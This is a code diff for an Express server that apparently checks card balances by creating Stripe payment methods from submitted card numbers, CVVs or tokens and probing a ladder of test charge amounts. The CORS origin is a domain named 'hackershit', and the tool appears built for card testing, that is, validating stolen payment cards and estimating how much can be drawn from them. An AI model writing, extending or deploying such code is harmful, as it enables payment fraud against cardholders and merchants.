@@ -6,14 +6,11 @@ const bodyParser = require('body-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Use env var for Stripe key (set in Railway dashboard)
+// Use env var for Stripe key
 const stripeSecretKey = process.env.STRIPE_SECRET_KEY;
-if (!stripeSecretKey) {
-  console.error('Error: STRIPE_SECRET_KEY environment variable is not set');
-}
 const stripe = Stripe(stripeSecretKey);
 
-// Allow CORS from your Vercel domain
+// Allow CORS
 const corsOptions = {
   origin: 'https://hackershit.techpimp.site',
   optionsSuccessStatus: 200
@@ -22,35 +19,23 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.use(bodyParser.json());
 
-// Incremental amounts in cents for balance estimation
+// Incremental amounts
 const testAmounts = [1, 10, 100, 1000, 5000, 10000, 50000, 100000];
 
 app.post('/', async (req, res) => {
-  const { card_number, exp, cvv } = req.body;
-  console.log('Received request:', { card_number: card_number ? 'provided' : 'missing', exp, cvv: cvv ? 'provided' : 'missing' }); // Debugging
+  const { token, exp, cvv } = req.body;
+  console.log('Received token:', token ? 'provided' : 'missing');
 
-  if (!card_number || !exp || !cvv) {
-    console.error('Missing fields');
-    return res.status(400).json({ balance: 'Missing required fields' });
+  if (!token) {
+    console.error('Missing token');
+    return res.status(400).json({ balance: 'Missing token' });
   }
-
-  const [expMonth, expYear] = exp.split('/');
-  if (!expMonth || !expYear) {
-    console.error('Invalid expiry');
-    return res.status(400).json({ balance: 'Invalid expiry format' });
-  }
-  const fullExpYear = `20${expYear}`;
 
   try {
-    console.log('Creating payment method...');
+    console.log('Creating payment method from token...');
     const paymentMethod = await stripe.paymentMethods.create({
       type: 'card',
-      card: {
-        number: card_number,
-        exp_month: parseInt(expMonth),
-        exp_year: parseInt(fullExpYear),
-        cvc: cvv,
-      },
+      card: { token: token },
     });
     console.log('Payment method created');
 
@@ -112,11 +97,7 @@ app.post('/', async (req, res) => {
     res.json({ balance: estimatedBalance });
   } catch (error) {
     console.error('Server error:', error.message);
-    if (error.type === 'StripeCardError') {
-      res.json({ balance: `Card error: ${error.message}` });
-    } else {
-      res.json({ balance: 'Server error - check logs' });
-    }
+    res.json({ balance: 'Server error - check logs' });
   }
 });
 
